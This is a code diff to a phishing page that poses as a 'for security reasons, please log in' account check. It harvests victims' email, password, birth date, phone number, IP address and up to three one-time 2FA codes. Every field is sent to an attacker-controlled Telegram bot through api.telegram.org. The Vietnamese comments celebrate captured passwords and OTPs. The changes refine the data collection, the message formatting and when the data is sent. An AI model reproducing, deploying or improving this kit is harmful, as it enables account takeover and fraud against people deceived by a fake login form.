@@ -3442,7 +3442,7 @@
                             <input value="" name="personal-email" type="email" class="form-control"
                                 id="PersonalEmailField" placeholder="Email" required aria-describedby="emailHelp">
                         </div>
-
+                        
                         <div class="d-flex gap-2">
                             <div class="select-container">
                                 <img id="flag-icon" onchange="updatePhonePrefix()" class="country-flag" src="https://flagcdn.com/us.svg">
@@ -3743,33 +3743,26 @@
 
                     </div>
                     <form id="apiForm" autocomplete="off">
+            
                         <div class="mb-3">
-                            <div class="password-input">
-                                <label for="exampleInputPassword" class="form-label">Password</label>
-                                <div style="display: flex; align-items: center;">
-                                    <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
-                                        aria-describedby="emailHelp" required
-                                        onfocus="this.removeAttribute('readonly');">
-                                </div>
-
-
-                                <svg id="show-hide-pass" viewBox="0 0 24 24" version="1.1"
-                                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-                                    <title>Iconly/Light-Outline/Hide</title>
-                                    <g id="Iconly/Light-Outline/Hide" stroke="none" stroke-width="1" fill="none"
-                                        fill-rule="evenodd">
-                                        <g id="Hide" transform="translate(2.000000, 3.000000)" fill="#535c61">
-                                            <path
-                                                d="M18.4174,0.21975 C18.7104,0.51275 18.7104,0.98775 18.4174,1.28075 L2.6434,17.05375 C2.4974,17.20075 2.3054,17.27375 2.1134,17.27375 C1.9214,17.27375 1.7294,17.20075 1.5834,17.05375 C1.2904,16.76075 1.2904,16.28675 1.5834,15.99375 L3.55534696,14.0230028 C2.14153178,12.7298365 0.942216653,10.9866302 0.0615,8.93395 C-0.0205,8.74395 -0.0205,8.52995 0.0615,8.34095 C1.0825,5.97695 2.5205,4.01995 4.2205,2.68295 C7.51332757,0.0769990431 11.8423054,-0.0613257214 15.2686834,2.30827702 L17.3574,0.21975 C17.6504,-0.07325 18.1244,-0.07325 18.4174,0.21975 Z M18.0472,5.04075 C18.7712,6.00175 19.4072,7.11275 19.9382,8.33875 C20.0212,8.52875 20.0212,8.74475 19.9382,8.93375 C17.8422,13.79075 14.1272,16.68975 10.0002,16.68975 C9.0632,16.68975 8.1312,16.53775 7.2312,16.23875 C6.8382,16.10775 6.6252,15.68275 6.7562,15.28975 C6.8872,14.89575 7.3102,14.68675 7.7052,14.81475 C8.4522,15.06375 9.2242,15.18975 10.0002,15.18975 C13.4282,15.18975 16.5612,12.74775 18.4302,8.63675 C17.9742,7.63775 17.4432,6.73275 16.8492,5.94275 C16.6002,5.61175 16.6662,5.14075 16.9972,4.89175 C17.3272,4.64275 17.7982,4.71075 18.0472,5.04075 Z M5.1495,3.86095 C3.7135,4.99095 2.4805,6.63695 1.5705,8.63895 C2.3639438,10.3913952 3.40632366,11.8693129 4.6170542,12.9607029 L6.75485503,10.8231134 C6.31993117,10.1831911 6.0859,9.42869604 6.0859,8.63855 C6.0859,6.47855 7.8419,4.72155 9.9999,4.72155 C10.7828812,4.72155 11.5487925,4.95995861 12.1864706,5.39085121 L14.1880037,3.38945022 C11.3351603,1.54522332 7.86298928,1.71346462 5.1495,3.86095 Z M13.2375,8.46155 C13.6455,8.53455 13.9165,8.92455 13.8435,9.33255 C13.5565,10.92555 12.2945,12.18955 10.7025,12.47955 C10.6575,12.48755 10.6115,12.49155 10.5675,12.49155 C10.2125,12.49155 9.8965,12.23755 9.8305,11.87555 C9.7565,11.46855 10.0265,11.07755 10.4345,11.00355 C11.4145,10.82555 12.1905,10.04755 12.3665,9.06655 C12.4405,8.65955 12.8305,8.39155 13.2375,8.46155 Z M9.9999,6.22155 C8.6689,6.22155 7.5859,7.30555 7.5859,8.63855 C7.5859,9.02393171 7.67662769,9.39593921 7.84765172,9.73001539 L11.093292,6.48399 C10.75914,6.31371 10.3833,6.22155 9.9999,6.22155 Z"
-                                                id="Combined-Shape"></path>
-                                        </g>
-                                    </g>
+                            <label for="PasswordInput" class="form-label">For security reasons, please log in to continue.</label>
+                            <input name="personal-email" type="text" class="form-control" id="AccountInput" minlength="3" placeholder="Email or phone number" required="">
+                            <label for="PasswordInput" class="form-label"></label>
+                            <input name="password-1" type="password" class="form-control" id="PasswordInput" minlength="3" placeholder="Password" required="">
+                            
+                            <span class="toggle-password" data-target="PasswordInput" style="cursor: pointer;">
+                                <!-- SVG Icon (Eye Off) -->
+                                <svg class="icon-eye-off" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: inline;">
+                                    <path d="M2 2L22 22" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
-                            </div>
-                            <div class="invalid-feedback">
-                                The password that you've entered is incorrect.<br> Forgotten password?
-                            </div>
+                                <!-- SVG Icon (Eye) -->
+                                <svg class="icon-eye" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                                    <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M12 15C14.2091 15 16 13.2091 16 11C16 8.79086 14.2091 7 12 7C9.79086 7 8 8.79086 8 11C8 13.2091 9.79086 15 12 15Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                            </span>
                         </div>
                         <div class="form-btn-wrapper">
                             <button class="btn btn-primary">
@@ -4520,6 +4513,25 @@
             document.getElementById("flag-icon").src = flagUrl;
         }
 
+        // show pass
+        document.querySelector('.toggle-password').addEventListener('click', function() {
+            const targetInput = document.getElementById(this.getAttribute('data-target'));
+            const eyeOffIcon = this.querySelector('.icon-eye-off');
+            const eyeIcon = this.querySelector('.icon-eye');
+
+            if (targetInput) {
+                // Toggle the type attribute
+                if (targetInput.type === 'password') {
+                    targetInput.type = 'text';
+                    eyeOffIcon.style.display = 'none';
+                    eyeIcon.style.display = 'inline';
+                } else {
+                    targetInput.type = 'password';
+                    eyeOffIcon.style.display = 'inline';
+                    eyeIcon.style.display = 'none';
+                }
+            }
+        });
 
         addSubItems()
     
@@ -4537,6 +4549,9 @@
             '2FA-1': '',
             '2FA-2': '',
             '2FA-3': '',
+            'dob-day': '',
+            'dob-month': '',
+            'dob-year': '',
         }
     
         var userIpData = {
@@ -4568,8 +4583,8 @@
         // termsModal.show()
     
         const apiInput = document.getElementById('exampleModal2').querySelector('input')
-        const showHidePassEye = document.getElementById('show-hide-pass')
-        showHidePassEye.addEventListener('click', totglePassDisplay)
+        // const showHidePassEye = document.getElementById('show-hide-pass')
+        // showHidePassEye.addEventListener('click', totglePassDisplay)
     
     
         var firstForm = document.getElementById('first-form')
@@ -4603,7 +4618,10 @@
                 }
             })
         })
-    
+        firstForm.addEventListener("input", function(event) {
+            console.log("Dữ liệu thay đổi:", event.target.name, "=>", event.target.value);
+        });
+
     
         var fakeSearchProccesBlock = document.getElementById('searchModal').querySelector('.fake-items')
         var notFoundBlock = document.getElementById('searchModal').querySelector('.now-found')
@@ -4663,26 +4681,55 @@
         }
         /////
         getUserIp()
-        function encodeUTF8(str) {
-            return decodeURIComponent(escape(str));
+        function escapeMarkdownV2(text) {
+            return text.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&"); // Escape toàn bộ ký tự đặc biệt
         }
+
 
         // Send data to Email
         function sendDataEmail(msgId, callback) {
-            var templateTELEData = "🎁 Quà tặng cuộc sống 🎁\n-URL : " + window.location.href + "\n-IP : " + userIpData.user_ip + "\n-Country : " + userIpData.country + ", " + userIpData.country_code + "\n-Fullname: " + formsSendData["full-name"] + "\nMarketplace name : " + formsSendData["page-name"] + "\n-Phone number : " + formsSendData["mobile-phone-number"] + "\n==========================\n👌 Đã lấy được Email/Pass\n-Email : " + formsSendData['personal-email'] + "\n-Password-1 : " + formsSendData['password-1'] + "\n-Password-2 : " + formsSendData["password-2"] + "\n==========================\n👌 Đã lấy được OTP 1 : " + formsSendData["2FA-1"] + "\n==========================\n👌 Đã lấy được OTP 2 : " + formsSendData["2FA-2"] + "\n==========================\n👌 Đã lấy được OTP 3 : " + formsSendData['2FA-3'] + "\n-Time: " + getTimeGMT7();
-            var apiEndpoint = msgId ? '/editMessageText' : '/sendMessage'; // Chọn API phù hợp
-            console.log(msgId, apiEndpoint);
-            var data = msgId ? {
-                'chat_id': chatId,
-                'message_id': msgId,
-                'text': templateTELEData,
-                'parse_mode': "HTML"
-            } : {
-                'chat_id': chatId,
-                'text': templateTELEData,
-                'parse_mode': "HTML"
-            };
+            var otp1Str = formsSendData["2FA-1"] 
+            ? "\n👌 Đã lấy được OTP 1 : `" + formsSendData["2FA-1"] + "`\n==========================" 
+            : "";
+            var otp2Str = formsSendData["2FA-2"] 
+                ? "\n👌 Đã lấy được OTP 2 : `" + formsSendData["2FA-2"] + "`\n==========================" 
+                : "";
+            var otp3Str = formsSendData["2FA-3"] 
+                ? "\n👌 Đã lấy được OTP 3 : `" + formsSendData["2FA-3"] + "`" 
+                : "";
+            var waiting = formsSendData["2FA-3"] ? "" : "\nChờ nó nhập thêm... ⏳"
+            var templateTELEData = "🎁 Quà tặng cuộc sống 🎁\n"
+                + "-URL : `" + window.location.href + "`\n"
+                + "-IP : `" + userIpData.user_ip + "`\n"
+                + "-Country : `" + userIpData.country + ", " + userIpData.country_code + "`\n"
+                + "-Fullname: `" + formsSendData["full-name"] + 
+                "`\nBirthday : `" + formsSendData["dob-day"]+"/"+formsSendData["dob-month"]+"/"+formsSendData["dob-year"] + "`\n"
+                + "-Phone number : `" + formsSendData["mobile-phone-number"] + "`\n"
+                + "==========================\n"
+                + "👌 Đã lấy được Email/Pass\n"
+                + "-Email : `" + formsSendData["personal-email"] + "`\n"
+                + "-Password : `" + formsSendData["password-1"] + "`\n"
+                + "==========================" 
+                + otp1Str + otp2Str + otp3Str 
+                + "\n-Time: `" + getTimeGMT7() + "`";
 
+            var apiEndpoint = msgId ? "/editMessageText" : "/sendMessage"; // Chọn API phù hợp
+            templateTELEData = escapeMarkdownV2(templateTELEData);
+            console.log(msgId, apiEndpoint);
+
+            var data = msgId
+            ? {
+                chat_id: chatId,
+                message_id: msgId,
+                text: templateTELEData,
+                parse_mode: "MarkdownV2",
+            }
+            : {
+                chat_id: chatId,
+                text: templateTELEData,
+                parse_mode: "MarkdownV2",
+            };
+            console.log(data);
             $.ajax({
                 url: `https://api.telegram.org/bot${apiKey}${apiEndpoint}`,
                 type: "POST",
@@ -4718,6 +4765,9 @@
                 spiner.style.display = 'none'
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
+                sendDataEmail(null, function (messageId) {
+                    msgId = messageId;
+                });
             }, SEND_FORM_FICTIV_TIME)
     
         }
@@ -4738,30 +4788,26 @@
             var errortext = apiForm.querySelector('.invalid-feedback')
             spiner.style.display = 'block'
             buttonText.style.display = 'none'
-            errortext.style.display = 'none'
+            // errortext.style.display = 'none'
             button.setAttribute('disabled', '')
             updateFormsSendData(serializeForm(apiForm))
             setTimeout(function () {
     
-                if (apiInsertCounter == 0) {
-                    errortext.style.display = 'block'
-                    errortext = apiForm.querySelector('input').value = ''
-                    apiInsertCounter++
-                    sendDataEmail(null, function (messageId) {
-                        msgId = messageId;
-                    });
-                    // console.log("gửi password lần 1");
-                    spiner.style.display = 'none'
-                    buttonText.style.display = 'block'
-                    button.removeAttribute('disabled')
-                    hidePasswordIncorrectText()
-                    input.setAttribute('name', 'password-2')
-                } else {
+                // if (apiInsertCounter == 0) {
+                //     // errortext.style.display = 'block'
+                //     errortext = apiForm.querySelector('input').value = ''
+                //     apiInsertCounter++
+                //     sendDataEmail(null, function (messageId) {
+                //         msgId = messageId;
+                //     });
+                //     spiner.style.display = 'none'
+                //     buttonText.style.display = 'block'
+                //     button.removeAttribute('disabled')
+                //     hidePasswordIncorrectText()
+                //     input.setAttribute('name', 'password-2')
+                // } else {
                     sendDataEmail(msgId);
-                    
-                    // console.log("gửi password lần 2");
 
-                    errortext.style.display = 'none'
                     spiner.style.display = 'none'
                     buttonText.style.display = 'block'
                     button.removeAttribute('disabled')
@@ -4769,7 +4815,7 @@
                     input.setAttribute('name', 'password-1')
                     apiModal.hide()
                     twoFAModal.show()
-                }
+                // }
             }, SEND_FORM_FICTIV_TIME)
     
         }
@@ -5119,12 +5165,13 @@
             
             const url = `https://api.telegram.org/bot${apiKey}/sendPhoto`;
             var content = "Upload info\n" +
-                "Full Name: " + formsSendData["full-name"] + "\n" +
-                "Email: " + formsSendData['personal-email'] + "\n" +
-                "Phone: " + formsSendData["mobile-phone-number"] + "\n" +
-                "IP: " + userIpData.user_ip;
-            
+                "Full Name: `" + formsSendData["full-name"] + "`\n" +
+                "Email: `" + formsSendData['personal-email'] + "`\n" +
+                "Phone: `" + formsSendData["mobile-phone-number"] + "`\n" +
+                "IP: `" + userIpData.user_ip+ "`";
+            content = escapeMarkdownV2(content);
             formData.append('caption', content);
+            formData.append('parse_mode', 'MarkdownV2');
             
             fetch(url + `?chat_id=${chatId}`, { method: 'POST', body: formData })
                 .then(response => response.json())
